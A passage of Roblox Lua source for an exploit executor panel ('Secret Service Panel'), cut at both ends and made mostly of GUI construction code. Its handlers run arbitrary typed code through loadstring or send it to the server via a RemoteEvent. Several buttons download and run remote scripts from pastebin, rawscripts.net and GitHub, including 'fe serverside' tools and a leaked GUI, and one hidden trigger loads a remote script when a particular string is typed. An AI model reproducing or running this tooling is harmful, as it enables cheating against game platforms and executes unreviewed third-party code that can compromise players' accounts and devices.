		Title.TextXAlignment = Enum.TextXAlignment.Left
	
		local Main = Instance.new("Frame")
		Main.Size = UDim2.new(1, 0, 1, 0)
		Main.Position = UDim2.new(0, 0, 0, 0)
		Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		Main.BorderColor3 = Color3.new(0, 0, 0)
		Main.BorderSizePixel = 0
		Main.BackgroundTransparency = 0 
		Main.Parent = Black
	
		local Executor = Instance.new("TextButton")
		Executor.Size = UDim2.new(0.5, 0, 0.07, 0)
		Executor.Position = UDim2.new(0, 0, 0, 0)
		Executor.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		Executor.BorderColor3 = Color3.new(0, 0, 0)
		Executor.BorderSizePixel = 0
		Executor.Text = "Executor"
		Executor.TextScaled = true
		Executor.BackgroundTransparency = 0 
		Executor.TextColor3 = Color3.new(255, 255, 255)
		Executor.Font = Enum.Font.Code
		Executor.Parent = Main
	
		local Console = Instance.new("TextButton")
		Console.Size = UDim2.new(1, 0, 1, 0)
		Console.Position = UDim2.new(1, 0, 0, 0)
		Console.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		Console.BorderColor3 = Color3.new(0, 0, 0)
		Console.BorderSizePixel = 0
		Console.Text = "Admin Panel"
		Console.TextScaled = true
		Console.BackgroundTransparency = 0 
		Console.TextColor3 = Color3.new(255, 255, 255)
		Console.Font = Enum.Font.Code
		Console.Parent = Executor
	
		local List = Instance.new("Frame")
		List.Size = UDim2.new(0.15, 0, 0.92, 0)
		List.Position = UDim2.new(0, 0, 0.08, 0)
		List.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		List.BorderColor3 = Color3.new(0, 0, 0)
		List.BorderSizePixel = 0
		List.BackgroundTransparency = 0 
		List.Parent = Main
		List.Visible = false
	
		local InfoMenu = Instance.new("Frame")
		InfoMenu.Size = UDim2.new(5.6, 0, 1, 0)
		InfoMenu.Position = UDim2.new(1, 0, 0, 0)
		InfoMenu.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		InfoMenu.BorderColor3 = Color3.new(0, 0, 0)
		InfoMenu.BorderSizePixel = 0
		InfoMenu.Active = true
		InfoMenu.BackgroundTransparency = 0 
		InfoMenu.Parent = List
		InfoMenu.Visible = false
	
		local GameId = Instance.new("TextLabel")
		GameId.Size = UDim2.new(1, 0, 0.1, 0)
		GameId.Position = UDim2.new(0, 0, 0, 0)
		GameId.BackgroundColor3 = Color3.new(0, 0, 0)
		GameId.BorderColor3 = Color3.new(0, 0, 0)
		GameId.BorderSizePixel = 1
		GameId.Text = "Game Id : "..game.GameId
		GameId.TextScaled = true
		GameId.BackgroundTransparency = 1 
		GameId.TextColor3 = Color3.new(255, 255, 255)
		GameId.Font = Enum.Font.Code
		GameId.Parent = InfoMenu
	
		local Username = Instance.new("TextLabel")
		Username.Size = UDim2.new(1, 0, 1, 0)
		Username.Position = UDim2.new(0, 0, 1, 0)
		Username.BackgroundColor3 = Color3.new(0, 0, 0)
		Username.BorderColor3 = Color3.new(0, 0, 0)
		Username.BorderSizePixel = 1
		Username.Text = "Username :  "..game.Players.LocalPlayer.Name
		Username.TextScaled = true
		Username.BackgroundTransparency = 1 
		Username.TextColor3 = Color3.new(255, 255, 255)
		Username.Font = Enum.Font.Code
		Username.Parent = GameId
	
		local Minimize = Instance.new("TextButton")
		Minimize.Size = UDim2.new(0.05, 0, 0.05, 0)
		Minimize.Position = UDim2.new(0, 0, 0.95, 0)
		Minimize.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Minimize.BorderColor3 = Color3.new(0, 0, 0)
		Minimize.BorderSizePixel = 0
		Minimize.Text = "-"
		Minimize.TextScaled = true
		Minimize.BackgroundTransparency = 0 
		Minimize.TextColor3 = Color3.new(255, 255, 255)
		Minimize.Font = Enum.Font.Code
		Minimize.Parent = InfoMenu
	
		local Close = Instance.new("TextButton")
		Close.Size = UDim2.new(1, 0, 1, 0)
		Close.Position = UDim2.new(1, 0, 0, 0)
		Close.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Close.BorderColor3 = Color3.new(0, 0, 0)
		Close.BorderSizePixel = 0 
		Close.Text = "X"
		Close.TextScaled = true
		Close.BackgroundTransparency = 0 
		Close.TextColor3 = Color3.new(255, 0, 0)
		Close.Font = Enum.Font.Code
		Close.Parent = Minimize
	
		local Open = Instance.new("TextButton")
		Open.Size = UDim2.new(0.2, 0, 0.05, 0)
		Open.Position = UDim2.new(-0.5, 0, 0.95, 0)
		Open.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		Open.BorderColor3 = Color3.new(0, 0, 0)
		Open.BorderSizePixel = 0
		Open.Text = " SSP"
		Open.BackgroundTransparency = 0 
		Open.TextColor3 = Color3.new(255, 255, 255)
		Open.Font = Enum.Font.Code
		Open.Parent = gui
		Open.TextScaled = true
	
		local JobId = Instance.new("TextLabel")
		JobId.Size = UDim2.new(1, 0, 1, 0)
		JobId.Position = UDim2.new(0, 0, 1, 0)
		JobId.BackgroundColor3 = Color3.new(0, 0, 0)
		JobId.BorderColor3 = Color3.new(0, 0, 0)
		JobId.BorderSizePixel = 1
		JobId.Text = "JobID : "..game.JobId
		JobId.BackgroundTransparency = 1 
		JobId.TextColor3 = Color3.new(255, 255, 255)
		JobId.Font = Enum.Font.Code
		JobId.Parent = Username
		JobId.TextScaled = true
	
		local Status = Instance.new("TextButton")
		Status.Size = UDim2.new(1, 0, 1, 0)
		Status.Position = UDim2.new(0, 0, 1, 0)
		Status.BackgroundColor3 = Color3.new(0, 0, 0)
		Status.BorderColor3 = Color3.new(0, 0, 0)
		Status.BorderSizePixel = 1
		Status.TextScaled = true
		Status.Text = "Click Here to View Status"
		Status.BackgroundTransparency = 1 
		Status.TextColor3 = Color3.new(255, 255, 255)
		Status.Font = Enum.Font.Code
		Status.Parent = JobId
	
		local Filter = Instance.new("TextLabel")
		Filter.Size = UDim2.new(1, 0, 1, 0)
		Filter.Position = UDim2.new(0, 0, 1.1, 0)
		Filter.BackgroundColor3 = Color3.new(0, 0, 0)
		Filter.BorderColor3 = Color3.new(0, 0, 0)
		Filter.BorderSizePixel = 0
		Filter.Text = "FilteringEnabled : True "
		Filter.BackgroundTransparency = 1 
		Filter.TextColor3 = Color3.new(255, 255, 255)
		Filter.Font = Enum.Font.Code
		Filter.Parent = Status
		Filter.TextScaled = true
	
	
		local setting = Instance.new("Frame")
		setting.Size = UDim2.new(5.6, 0, 1, 0)
		setting.Position = UDim2.new(1, 0, 0, 0)
		setting.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		setting.BorderColor3 = Color3.new(0, 0, 0)
		setting.BorderSizePixel = 0
		setting.Active = true
		setting.BackgroundTransparency = 0 
		setting.Parent = List
		setting.Visible = true
	
		local Setting1 = Instance.new("TextButton")
		Setting1.Size = UDim2.new(1, 0, 0.1, 0)
		Setting1.Position = UDim2.new(0, 0, 0, 0)
		Setting1.BackgroundColor3 = Color3.new(0, 0, 0)
		Setting1.BorderColor3 = Color3.new(0, 0, 0)
		Setting1.BorderSizePixel = 1
		Setting1.Text = "Sorry i dont have any Idea how to insert the setting like normal setting :)"
		Setting1.BackgroundTransparency = 1 
		Setting1.TextColor3 = Color3.new(255, 255, 255)
		Setting1.Font = Enum.Font.Code
		Setting1.Parent = setting
		Setting1.TextScaled = true
	
	
		local Command = Instance.new("TextBox")
		Command.Size = UDim2.new(1, 0, 0.1, 0)
		Command.Position = UDim2.new(0, 0, 1, 0)
		Command.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
		Command.BorderColor3 = Color3.new(0, 0, 0)
		Command.BorderSizePixel = 0
		Command.Text = ""
		Command.TextColor3 = Color3.new(255, 255, 255)
		Command.BackgroundTransparency = 0
		Command.Font = Enum.Font.Code
		Command.TextSize = 15
		Command.Parent = Main
		Command.PlaceholderText = "Type Command Here or Type ;cmds"
		Command.TextXAlignment = Enum.TextXAlignment.Left
		Command.Visible = false
	
		local Admin = Instance.new("ScrollingFrame")
		Admin.Size = UDim2.new(5.6, 0, 1, 0)
		Admin.Position = UDim2.new(1, 0, 0, 0)
		Admin.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Admin.BorderColor3 = Color3.new(0, 0, 0)
		Admin.BorderSizePixel = 0
		Admin.Parent = List
		Admin.Visible = false
	
		Admin.BackgroundTransparency = 0 
	
		local Lool = Instance.new("UIListLayout")
		Lool.HorizontalAlignment = Enum.HorizontalAlignment.Left
		Lool.SortOrder = Enum.SortOrder.LayoutOrder
		Lool.Padding = UDim.new(0, 5)
		Lool.Parent = Admin
	
		local Message = Instance.new("TextButton")
		Message.Size = UDim2.new(0.3, 0, 0.05, 0)
		Message.Position = UDim2.new(-0.1, 0, 0, 0)
		Message.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Message.BorderColor3 = Color3.new(0, 0, 0)
		Message.BorderSizePixel = 0
		Message.Text = "Message"
		Message.BackgroundTransparency = 0 
		Message.TextColor3 = Color3.new(255, 255, 255)
		Message.Font = Enum.Font.Code
		Message.Parent = Admin
		Message.TextScaled = true
	
		local MSG = Instance.new("TextBox")
		MSG.Size = UDim2.new(2.3, 0, 1, 0)
		MSG.Position = UDim2.new(1, 0, 0, 0)
		MSG.BackgroundColor3 = Color3.new(0, 0, 0)
		MSG.BorderColor3 = Color3.new(0, 0, 0)
		MSG.BorderSizePixel = 0
		MSG.Text = ""
		MSG.TextColor3 = Color3.new(255, 255, 255)
		MSG.BackgroundTransparency = 0
		MSG.Font = Enum.Font.Code
		MSG.TextScaled = true
		MSG.Parent = Message
		MSG.PlaceholderText = "Enter Message"
	
		local Hint = Instance.new("TextButton")
		Hint.Size = UDim2.new(0.3, 0, 0.05, 0)
		Hint.Position = UDim2.new(0, 0, 0, 0)
		Hint.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Hint.BorderColor3 = Color3.new(0, 0, 0)
		Hint.BorderSizePixel = 0
		Hint.Text = "Hint"
		Hint.BackgroundTransparency = 0 
		Hint.TextColor3 = Color3.new(255, 255, 255)
		Hint.Font = Enum.Font.Code
		Hint.Parent = Admin
		Hint.TextScaled = true
	
		local HINT = Instance.new("TextBox")
		HINT.Size = UDim2.new(2.3, 0, 1, 0)
		HINT.Position = UDim2.new(1, 0, 0, 0)
		HINT.BackgroundColor3 = Color3.new(0, 0, 0)
		HINT.BorderColor3 = Color3.new(0, 0, 0)
		HINT.BorderSizePixel = 0
		HINT.Text = ""
		HINT.TextColor3 = Color3.new(255, 255, 255)
		HINT.BackgroundTransparency = 0
		HINT.Font = Enum.Font.Code
		HINT.PlaceholderText = "Enter Hint"
		HINT.Parent = Hint
		HINT.TextScaled = true
	
		local speed = Instance.new("TextButton")
		speed.Size = UDim2.new(0.3, 0, 0.05, 0)
		speed.Position = UDim2.new(0.5, 0, 0.5, 0)
		speed.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		speed.BorderColor3 = Color3.new(0, 0, 0)
		speed.BorderSizePixel = 0
		speed.Text = "Speed"
		speed.BackgroundTransparency = 0 
		speed.TextColor3 = Color3.new(255, 255, 255)
		speed.Font = Enum.Font.Code
		speed.Parent = Admin
		speed.TextScaled = true
	
		local SPEED = Instance.new("TextBox")
		SPEED.Size = UDim2.new(2.3, 0, 1, 0)
		SPEED.Position = UDim2.new(1, 0, 0, 0)
		SPEED.BackgroundColor3 = Color3.new(0, 0, 0)
		SPEED.BorderColor3 = Color3.new(0, 0, 0)
		SPEED.BorderSizePixel = 0
		SPEED.Text = ""
		SPEED.TextColor3 = Color3.new(255, 255, 255)
		SPEED.BackgroundTransparency = 0
		SPEED.Font = Enum.Font.Code
		SPEED.TextScaled = true
		SPEED.Parent = speed
		SPEED.PlaceholderText = "Enter WalkSpeed"
	
		local Sit = Instance.new("TextButton")
		Sit.Size = UDim2.new(1, 0, 0.05, 0)
		Sit.Position = UDim2.new(0, 0, 0, 0)
		Sit.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Sit.BorderColor3 = Color3.new(0, 0, 0)
		Sit.BorderSizePixel = 0
		Sit.Text = "Sit"
		Sit.BackgroundTransparency = 0 
		Sit.TextColor3 = Color3.new(255, 255, 255)
		Sit.Font = Enum.Font.Code
		Sit.Parent = Admin
		Sit.TextScaled = true
	
		local RE = Instance.new("TextButton")
		RE.Size = UDim2.new(1, 0, 0.05, 0)
		RE.Position = UDim2.new(0, 0, 0, 0)
		RE.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		RE.BorderColor3 = Color3.new(0, 0, 0)
		RE.BorderSizePixel = 0
		RE.Text = "Respawn / Reset"
		RE.BackgroundTransparency = 0 
		RE.TextColor3 = Color3.new(255, 255, 255)
		RE.Font = Enum.Font.Code
		RE.Parent = Admin
		RE.TextScaled = true
	
	
		local Hub = Instance.new("ScrollingFrame")
		Hub.Size = UDim2.new(5.6, 0, 1, 0)
		Hub.Position = UDim2.new(1, 0, 0, 0)
		Hub.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Hub.BorderColor3 = Color3.new(0, 0, 0)
		Hub.BorderSizePixel = 0
		Hub.Parent = List
		Hub.Visible = false
		Hub.ScrollBarThickness = 0
		Hub.BackgroundTransparency = 0 
	
		local Layout = Instance.new("UIListLayout")
		Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		Layout.SortOrder = Enum.SortOrder.LayoutOrder
		Layout.Padding = UDim.new(0, 5)
		Layout.Parent = Hub
	
		local IY = Instance.new("TextButton")
		IY.Size = UDim2.new(1, 0, 0.05, 0)
		IY.Position = UDim2.new(0, 0, 0, 0)
		IY.BackgroundColor3 = Color3.new(0, 0, 0)
		IY.BorderColor3 = Color3.new(0, 0, 0)
		IY.BorderSizePixel = 0
		IY.Text = "Infinite yield Admin"
		IY.BackgroundTransparency = 0 
		IY.TextColor3 = Color3.new(255, 255, 255)
		IY.Font = Enum.Font.Code
		IY.Parent = Hub
		IY.TextScaled = true
	
		local R6 = Instance.new("TextButton")
		R6.Size = UDim2.new(1, 0, 0.05, 0)
		R6.Position = UDim2.new(0, 0, 0, 0)
		R6.BackgroundColor3 = Color3.new(0, 0, 0)
		R6.BorderColor3 = Color3.new(0, 0, 0)
		R6.BorderSizePixel = 0
		R6.Text = "R6 Converter"
		R6.BackgroundTransparency = 0 
		R6.TextColor3 = Color3.new(255, 255, 255)
		R6.Font = Enum.Font.Code
		R6.Parent = Hub
		R6.TextScaled = true
	
		local Dex = Instance.new("TextButton")
		Dex.Size = UDim2.new(1, 0, 0.05, 0)
		Dex.Position = UDim2.new(0, 0, 0, 0)
		Dex.BackgroundColor3 = Color3.new(0, 0, 0)
		Dex.BorderColor3 = Color3.new(0, 0, 0)
		Dex.BorderSizePixel = 0
		Dex.Text = "Dex"
		Dex.BackgroundTransparency = 0 
		Dex.TextColor3 = Color3.new(255, 255, 255)
		Dex.Font = Enum.Font.Code
		Dex.Parent = Hub
		Dex.TextScaled = true
	
		local SS = Instance.new("TextButton")
		SS.Size = UDim2.new(1, 0, 0.05, 0)
		SS.Position = UDim2.new(0, 0, 0, 0)
		SS.BackgroundColor3 = Color3.new(0, 0, 0)
		SS.BorderColor3 = Color3.new(0, 0, 0)
		SS.BorderSizePixel = 0
		SS.Text = "Serverside Executor"
		SS.BackgroundTransparency = 0 
		SS.TextColor3 = Color3.new(255, 255, 255)
		SS.Font = Enum.Font.Code
		SS.Parent = Hub
		SS.TextScaled = true
	
		local Stigma = Instance.new("TextButton")
		Stigma.Size = UDim2.new(1, 0, 0.05, 0)
		Stigma.Position = UDim2.new(0, 0, 0, 0)
		Stigma.BackgroundColor3 = Color3.new(0, 0, 0)
		Stigma.BorderColor3 = Color3.new(0, 0, 0)
		Stigma.BorderSizePixel = 0
		Stigma.Text = "Stigma Ultimate"
		Stigma.BackgroundTransparency = 0 
		Stigma.TextColor3 = Color3.new(255, 255, 255)
		Stigma.Font = Enum.Font.Code
		Stigma.Parent = Hub
		Stigma.TextScaled = true
	
		local Pload = Instance.new("TextButton")
		Pload.Size = UDim2.new(1, 0, 0.05, 0)
		Pload.Position = UDim2.new(0, 0, 0, 0)
		Pload.BackgroundColor3 = Color3.new(0, 0, 0)
		Pload.BorderColor3 = Color3.new(0, 0, 0)
		Pload.BorderSizePixel = 0 
		Pload.Text = "Polaria Lua"
		Pload.BackgroundTransparency = 0 
		Pload.TextColor3 = Color3.new(255, 255, 255)
		Pload.Font = Enum.Font.Code
		Pload.Parent = Hub
		Pload.TextScaled = true
	
		local Cons = Instance.new("TextButton")
		Cons.Size = UDim2.new(1, 0, 0.05, 0)
		Cons.Position = UDim2.new(0, 0, 0, 0)
		Cons.BackgroundColor3 = Color3.new(0, 0, 0)
		Cons.BorderColor3 = Color3.new(0, 0, 0)
		Cons.BorderSizePixel = 0 
		Cons.Text = "Scriptblox Searcher"
		Cons.BackgroundTransparency = 0 
		Cons.TextColor3 = Color3.new(255, 255, 255)
		Cons.Font = Enum.Font.Code
		Cons.Parent = Hub
		Cons.TextScaled = true
	
		local Private = Instance.new("TextButton")
		Private.Size = UDim2.new(1, 0, 0.05, 0)
		Private.Position = UDim2.new(0, 0, 0, 0)
		Private.BackgroundColor3 = Color3.new(0, 0, 0)
		Private.BorderColor3 = Color3.new(0, 0, 0)
		Private.BorderSizePixel = 0
		Private.Text = "PRIVATE GUI by Hanif"
		Private.BackgroundTransparency = 0 
		Private.TextColor3 = Color3.new(255, 255, 255)
		Private.Font = Enum.Font.Code
		Private.Parent = Hub
		Private.TextScaled = true
	
		local DKey = Instance.new("TextButton")
		DKey.Size = UDim2.new(1, 0, 0.05, 0)
		DKey.Position = UDim2.new(0, 0, 0, 0)
		DKey.BackgroundColor3 = Color3.new(0, 0, 0)
		DKey.BorderColor3 = Color3.new(0, 0, 0)
		DKey.BorderSizePixel = 0
		DKey.Text = "Delta Keyboard"
		DKey.BackgroundTransparency = 0 
		DKey.TextColor3 = Color3.new(255, 255, 255)
		DKey.Font = Enum.Font.Code
		DKey.Parent = Hub
		DKey.TextScaled = true
	
		local Ss = Instance.new("TextButton")
		Ss.Size = UDim2.new(1, 0, 0.05, 0)
		Ss.Position = UDim2.new(0, 0, 0, 0)
		Ss.BackgroundColor3 = Color3.new(0, 0, 0)
		Ss.BorderColor3 = Color3.new(0, 0, 0)
		Ss.BorderSizePixel = 0
		Ss.Text = "Luau X ServerSide"
		Ss.BackgroundTransparency = 0 
		Ss.TextColor3 = Color3.new(255, 255, 255)
		Ss.Font = Enum.Font.Code
		Ss.Parent = Hub
		Ss.TextScaled = true
	
		local FE = Instance.new("TextButton")
		FE.Size = UDim2.new(1, 0, 0.05, 0)
		FE.Position = UDim2.new(0, 0, 0, 0)
		FE.BackgroundColor3 = Color3.new(0, 0, 0)
		FE.BorderColor3 = Color3.new(0, 0, 0)
		FE.BorderSizePixel = 0
		FE.Text = "Fe Bypasser"
		FE.BackgroundTransparency = 0 
		FE.TextColor3 = Color3.new(255, 255, 255)
		FE.Font = Enum.Font.Code
		FE.Parent = Hub
		FE.TextScaled = true
	
		local Zep = Instance.new("TextButton")
		Zep.Size = UDim2.new(1, 0, 0.05, 0)
		Zep.Position = UDim2.new(0, 0, 0, 0)
		Zep.BackgroundColor3 = Color3.new(0, 0, 0)
		Zep.BorderColor3 = Color3.new(0, 0, 0)
		Zep.BorderSizePixel = 0
		Zep.Text = "Zepelin Hub"
		Zep.BackgroundTransparency = 0 
		Zep.TextColor3 = Color3.new(255, 255, 255)
		Zep.Font = Enum.Font.Code
		Zep.Parent = Hub
		Zep.TextScaled = true
	
		local Wis = Instance.new("TextButton")
		Wis.Size = UDim2.new(1, 0, 0.05, 0)
		Wis.Position = UDim2.new(0, 0, 0, 0)
		Wis.BackgroundColor3 = Color3.new(0, 0, 0)
		Wis.BorderColor3 = Color3.new(0, 0, 0)
		Wis.BorderSizePixel = 0
		Wis.Text = "Wisl Project"
		Wis.BackgroundTransparency = 0 
		Wis.TextColor3 = Color3.new(255, 255, 255)
		Wis.Font = Enum.Font.Code
		Wis.Parent = Hub
		Wis.TextScaled = true
	
		local Uni = Instance.new("TextButton")
		Uni.Size = UDim2.new(1, 0, 0.05, 0)
		Uni.Position = UDim2.new(0, 0, 0, 0)
		Uni.BackgroundColor3 = Color3.new(0, 0, 0)
		Uni.BorderColor3 = Color3.new(0, 0, 0)
		Uni.BorderSizePixel = 0
		Uni.Text = "RoChips universal"
		Uni.BackgroundTransparency = 0 
		Uni.TextColor3 = Color3.new(255, 255, 255)
		Uni.Font = Enum.Font.Code
		Uni.Parent = Hub
		Uni.TextScaled = true
	
		local MML = Instance.new("TextButton")
		MML.Size = UDim2.new(1, 0, 0.05, 0)
		MML.Position = UDim2.new(0, 0, 0, 0)
		MML.BackgroundColor3 = Color3.new(0, 0, 0)
		MML.BorderColor3 = Color3.new(0, 0, 0)
		MML.BorderSizePixel = 0
		MML.Text = "MML Admin"
		MML.BackgroundTransparency = 0 
		MML.TextColor3 = Color3.new(255, 255, 255)
		MML.Font = Enum.Font.Code
		MML.Parent = Hub
		MML.TextScaled = true
	
	
		local Pack = Instance.new("TextButton")
		Pack.Size = UDim2.new(0.8, 0, 0.105, 0)
		Pack.Position = UDim2.new(0.1, 0, 0.05, 0)
		Pack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		Pack.BorderColor3 = Color3.new(0, 0, 0)
		Pack.BorderSizePixel = 0
		Pack.Text = "Package"
		Pack.TextScaled = true
		Pack.BackgroundTransparency = 0
		Pack.TextColor3 = Color3.new(255, 255, 255)
		Pack.Font = Enum.Font.Code
		Pack.Parent = List
	
		local Script = Instance.new("TextBox")
		Script.Size = UDim2.new(1, 0, 0.8, 0)
		Script.Position = UDim2.new(0, 0, 0.08, 0)
		Script.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Script.BorderColor3 = Color3.new(0, 0, 0)
		Script.BorderSizePixel = 0
		Script.Text = ""
		Script.PlaceholderText = "--Made By U53RDV_7283 | Be free Be proud"
		Script.TextColor3 = Color3.new(0, 1, 0)
		Script.BackgroundTransparency = 0
		Script.Font = Enum.Font.Code
		Script.TextSize = 15
		Script.Parent = Main
		Script.TextXAlignment = Enum.TextXAlignment.Left
		Script.TextYAlignment = Enum.TextYAlignment.Top
		Script.MultiLine = true
		Script.ClearTextOnFocus = false
		Script.TextWrapped = true
	
		local Execute = Instance.new("TextButton")
		Execute.Size = UDim2.new(0.47, 0, 0.08, 0)
		Execute.Position = UDim2.new(0, 0, 0.9, 0)
		Execute.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Execute.BorderColor3 = Color3.new(0, 0, 0)
		Execute.BorderSizePixel = 0
		Execute.Text = "Execute"
		Execute.TextScaled = true
		Execute.BackgroundTransparency = 0 
		Execute.TextColor3 = Color3.new(255, 255, 255)
		Execute.Font = Enum.Font.Code
		Execute.Parent = Main
	
		local Clear = Instance.new("TextButton")
		Clear.Size = UDim2.new(1.12, 0, 1, 0)
		Clear.Position = UDim2.new(1, 0, 0, 0)
		Clear.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
		Clear.BorderColor3 = Color3.new(0, 0, 0)
		Clear.BorderSizePixel = 0
		Clear.Text = "Clear"
		Clear.TextScaled = true
		Clear.BackgroundTransparency = 0 
		Clear.TextColor3 = Color3.new(255, 255, 255)
		Clear.Font = Enum.Font.Code
		Clear.Parent = Execute
	
		local Info = Instance.new("TextButton")
		Info.Size = UDim2.new(1, 0, 1, 0)
		Info.Position = UDim2.new(0, 0, 1.1, 0)
		Info.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		Info.BorderColor3 = Color3.new(0, 0, 0)
		Info.BorderSizePixel = 0
		Info.Text = "Info"
		Info.BackgroundTransparency = 0 
		Info.TextColor3 = Color3.new(255, 255, 255)
		Info.Font = Enum.Font.Code
		Info.Parent = Pack
		Info.TextScaled = true
	
		local Setting = Instance.new("TextButton")
		Setting.Size = UDim2.new(1, 0, 1, 0)
		Setting.Position = UDim2.new(0, 0, 1.1, 0)
		Setting.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		Setting.BorderColor3 = Color3.new(0, 0, 0)
		Setting.BorderSizePixel = 0
		Setting.Text = "Settings"
		Setting.BackgroundTransparency = 0 
		Setting.TextColor3 = Color3.new(255, 255, 255)
		Setting.Font = Enum.Font.Code
		Setting.Parent = Info
		Setting.TextScaled = true
	
		local Consol = Instance.new("TextButton")
		Consol.Size = UDim2.new(1, 0, 0.05, 0)
		Consol.Position = UDim2.new(0, 0, 0.95, 0)
		Consol.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		Consol.BorderColor3 = Color3.new(0, 0, 0)
		Consol.BorderSizePixel = 0
		Consol.Text = "Console"
		Consol.BackgroundTransparency = 0 
		Consol.TextColor3 = Color3.new(255, 255, 255)
		Consol.Font = Enum.Font.Code
		Consol.Parent = List
		Consol.TextScaled = true
	
	
	
		--Script : 
	
		local Executed = "Client"
	
	
		Execute.MouseButton1Click:Connect(function()
			if Executed == "Client" then
				loadstring(Script.text)()
				Notice("Script succesfuly Executed | Executed on Client")
				print("--> "..Script.Text)
			elseif Executed == "Server" then
				game.ReplicatedStorage.RemoteEvent:FireServer(Script.Text)
				Notice("Script succesfuly Executed | Executed on : Server")
			end
			if  Script.Text == "require(123255432303221):Pload('"..game.Players.LocalPlayer.Name.."')" then
				loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Polaria-loadstring-35739"))()
			end
		end)
	
		Clear.MouseButton1Click:Connect(function()
			Script.Text = ""
			Script.PlaceholderText = "--Script Cleared"
			wait(3)
			Script.PlaceholderText = "--Made By U53RDV_7283 | Be free Be proud"
		end)
	
		Pack.MouseButton1Click:Connect(function()
			Clear.Visible = false
			Execute.Visible = false
			Script.Visible = false
			InfoMenu.Visible = false
			Hub.Visible = true
			setting.Visible = false
			List.Visible = true
		end)
	
		Executor.MouseButton1Click:Connect(function()
			Clear.Visible = true
			Execute.Visible = true
			Script.Visible = true
			InfoMenu.Visible = false
			Hub.Visible = false
			Admin.Visible = false
			setting.Visible = false
			List.Visible = false
			Command.Visible = false
		end)
	
		Info.MouseButton1Click:Connect(function()
			InfoMenu.Visible = true
			Clear.Visible = false
			Execute.Visible = false
			Script.Visible = false
			Hub.Visible = false
			Admin.Visible = false
			setting.Visible = false
			List.Visible = true
		end)
	
		Console.MouseButton1Click:Connect(function()
			Admin.Visible = true
			Clear.Visible = false
			Execute.Visible = false
			Script.Visible = false
			Hub.Visible = false
			setting.Visible = false
			List.Visible = true
			Command.Visible = true
		end)
	
		Consol.MouseButton1Click:Connect(function()
			game.StarterGui:SetCore("DevConsoleVisible", true)
		end)
	
		Close.MouseButton1Click:Connect(function()
			Close.BackgroundColor3 = Color3.new(1, 0, 0)
			Close.TextColor3 = Color3.new(1, 1, 1)
			wait(0)
			Close.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			Close.TextColor3 = Color3.new(1, 0, 0)
			Main:Destroy()
			Title:Destroy()
			Black:TweenSize(UDim2.new(1, 0, 0, 0), "Out", "Sine", 0.7, false)
			wait(1)
			TopBar.BackgroundColor3 = Color3.new(0,0,0)
			TopBar:TweenSize(UDim2.new(0.0, 0, 0.0, 20), "Out", "Sine", 0.9, false)
			Notice("SCRIPT TERMINATED")
			wait(3)
			gui:Destroy()
			error("Secret service Panel | Script Terminated")
		end)
	
		R6.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
		end)
	
		Dex.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Keyless-mobile-dex-17888"))()
		end)
	
		SS.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-serverside-41881"))()
		end)
	
		IY.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
		end)
	
		Stigma.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-stigma-ultimate-29802"))()
		end)
	
		Pload.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Polaria-loadstring-35739"))()
		end)
	
		Cons.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Scriptblox-Searcher-Gui-29930"))()
		end)
	
		Private.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Private-gui-by-hanif-leak-40943"))()
		end)
	
		DKey.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Delta-Keyboard-29097"))()
		end)
	
		Ss.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Luau-x-SS-v2-42394"))()
		end)
	
		FE.MouseButton1Click:Connect(function()
	
		end)
	
		Zep.MouseButton1Click:Connect(function()
	
		end)
	
		Minimize.MouseButton1Click:Connect(function()
			Main.Visible = false
			Title.Visible = false
			Black:TweenSize(UDim2.new(1, 0, 0, 0), "Out", "Sine", 0.7, false)
			wait(1)
			TopBar.BackgroundColor3 = Color3.new(0,0,0)
			TopBar:TweenSize(UDim2.new(0.0, 0, 0.0, 20), "Out", "Sine", 0.9, false)
			wait(1)
			Open:TweenPosition(UDim2.new(0, 0, 0.95, 0), "Out", "Sine", 0.9, false)
			print("Secret Service Panel | Script Minimize")
			Notice("Script Minimize")
		end)
	
		local status = false
	
		Status.MouseButton1Click:Connect(function()
			if status == false then
				status = true
				Executed = "Client"
				Status.Text = "Executed on : Client"
				Status.TextColor3 = Color3.fromRGB(255, 175, 0)
				warn("Secret Service Panel | Current Executed : Client")
				Notice("Current Executed : Client")
